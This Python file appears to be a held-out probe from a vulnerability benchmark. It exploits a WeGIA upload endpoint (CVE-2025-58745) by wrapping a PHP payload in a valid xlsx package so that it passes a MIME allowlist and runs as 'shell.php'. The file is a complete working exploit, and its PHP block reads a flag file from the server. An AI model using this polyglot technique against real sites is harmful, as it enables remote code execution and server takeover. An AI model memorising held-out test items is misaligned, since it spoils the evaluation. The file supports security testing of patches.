#!/usr/bin/env python3
"""[HELD-OUT] CVE-2025-58745 residual — xlsx-polyglot MIME-spoof of the SAME upload endpoint.

The CVE-2025-22133 fix that WeGIA 3.4.10 relies on is a CONTENT-TYPE allowlist only:

    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $tipoMime = finfo_file($finfo, $_FILES['arquivo']['tmp_name']);
    if (!in_array($tipoMime, ['application/vnd.ms-excel',
                              'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet']))
        { http_response_code(400); ... exit; }

It NEVER validates the filename extension nor the real content — the file is still stored
under html/socio/sistema/tabelas/ KEEPING its attacker-chosen extension (uniqid()."_".name.".php").
finfo classifies by leading magic bytes, so a real xlsx (ZIP/OOXML) container satisfies the
allowlist. A .php whose bytes are  <valid xlsx package> + <?php ...?>  therefore:
    - finfo(...) -> application/vnd.openxmlformats-officedocument.spreadsheetml.sheet  (allowlisted, passes)
    - is stored as ...shell.php
    - when GET-requested, the PHP interpreter emits the leading zip bytes verbatim and then
      EXECUTES the trailing <?php ...?> block -> the canary is echoed.

Contract:
  V1 (WeGIA 3.4.10): finfo sees Excel -> upload accepted -> .php stored & executed. REACHES flag.
  V2 (WeGIA 3.4.11): the CVE-2025-58745 fix DELETES controla_xlsx.php entirely -> the POST 404s,
      nothing is stored. BLOCKED (no flag).

Same sink / same flag channel as the seed (an executed uploaded .php echoing the canary) -> Variant A.
NEVER exposed to the system-under-test (held out under _heldout/).
"""
from __future__ import annotations

import io
import zipfile

PHP = b"<?php echo 'PCBEXEC:'.@file_get_contents('/flag/pcb_flag.txt'); ?>\n"

# Minimal but structurally-valid OOXML (.xlsx) package. libmagic classifies this as
# application/vnd.openxmlformats-officedocument.spreadsheetml.sheet from the ZIP + xl/ parts.
_CONTENT_TYPES = (
    b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    b'<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    b'<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
    b'<Default Extension="xml" ContentType="application/xml"/>'
    b'<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>'
    b'<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>'
    b'</Types>'
)
_RELS = (
    b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    b'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>'
    b'</Relationships>'
)
_WORKBOOK = (
    b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    b'<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" '
    b'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
    b'<sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets></workbook>'
)
_WB_RELS = (
    b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    b'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>'
    b'</Relationships>'
)
_SHEET = (
    b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    b'<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
    b'<sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>x</t></is></c></row></sheetData></worksheet>'
)


def _xlsx() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", _CONTENT_TYPES)
        z.writestr("_rels/.rels", _RELS)
        z.writestr("xl/workbook.xml", _WORKBOOK)
        z.writestr("xl/_rels/workbook.xml.rels", _WB_RELS)
        z.writestr("xl/worksheets/sheet1.xml", _SHEET)
    return buf.getvalue()


# xlsx package followed by the PHP payload (appended AFTER the zip EOCD so the <?php tag is a
# literal in the on-disk bytes and executes, while finfo still reads Excel magic from offset 0).
POLYGLOT_PHP = _xlsx() + PHP


def candidate() -> dict:
    """Request candidate for the CVE-2025-58745 residual (xlsx-polyglot .php upload)."""
    return {
        "probe_id": "cve-2025-58745-controla-xlsx-xlsx-magic-polyglot-php",
        "mode": "xlsx_polyglot",    # finfo -> Excel MIME (passes V1); stored .php executes
        "filename": "shell.php",
        "payload": POLYGLOT_PHP,
    }


if __name__ == "__main__":
    c = candidate()
    print({k: (v if k != "payload" else f"<{len(v)} bytes>") for k, v in c.items()})
